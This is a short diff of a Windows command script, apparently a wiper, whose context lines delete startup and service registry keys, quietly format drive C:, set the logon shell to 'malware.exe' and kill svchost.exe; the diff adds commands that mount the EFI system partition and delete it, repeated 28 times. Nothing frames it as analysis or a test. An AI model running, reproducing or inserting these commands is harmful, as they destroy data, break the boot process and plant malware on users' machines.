@@ -20,5 +20,32 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services" /f
 format C: /fs:NTFS /q /y
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "malware.exe" /f
+mountvol W: /s
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
+rd W: /s /q
 taskkill /f /im svchost.exe
-
